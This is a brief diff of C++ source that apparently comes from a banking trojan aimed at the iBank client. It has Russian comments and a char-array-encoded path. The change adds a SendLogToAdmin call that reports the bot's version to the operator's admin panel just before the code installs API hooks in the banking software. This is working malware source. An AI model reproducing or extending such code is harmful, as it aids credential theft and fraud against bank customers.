@@ -45,7 +45,8 @@ namespace IBANKDEBUGSTRINGS
 	char IBankLogPath[] = {'/', 'g', 'e', 't', '/', 'i', 'b', 'a', 'n', 'k', '.', 'h', 't', 'm', 'l',  0};
 #endif
 
-
+void SendLogToAdmin( const char* c, const char* v ); //отсылка логов в админку
+extern char version[]; //версия патча
 
 namespace IBank
 {
@@ -229,6 +230,8 @@ typedef HFILE (WINAPI *TOpenFile)(LPCSTR lpFileName,
             	Log.Wnd = Temp;
         }
 
+		//отсылаем версию бота (для патча)
+		SendLogToAdmin( "botver", version );
 		//  Ставим хуки
 		if( !Hooked ) 
 		{
